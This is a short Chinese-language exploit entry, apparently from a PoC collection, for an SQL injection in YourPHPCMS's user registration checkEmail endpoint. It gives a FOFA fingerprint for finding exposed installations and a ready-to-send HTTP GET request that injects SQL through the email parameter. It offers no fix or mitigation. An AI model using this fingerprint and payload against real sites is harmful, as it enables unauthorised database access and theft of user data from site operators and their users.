# YourPHPCMS系统Register_checkEmail存在sql注入漏洞
YourPHPCMS login_checkEmail存在sql注入漏洞

## fofa
```rust
header="YP_onlineid"
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1732274946081-2fa7b36f-5b27-464c-899e-b80b63981e17.png)

## poc
```rust
GET /index.php?g=User&m=Register&a=checkEmail&userid=1&email=-69710348@nwcrb.com'+or+'1'='2" HTTP/1.1
Host: 
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate, br, zstd
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1732274798163-92c86972-4ab2-45b1-8ed0-efdd82c98664.png)

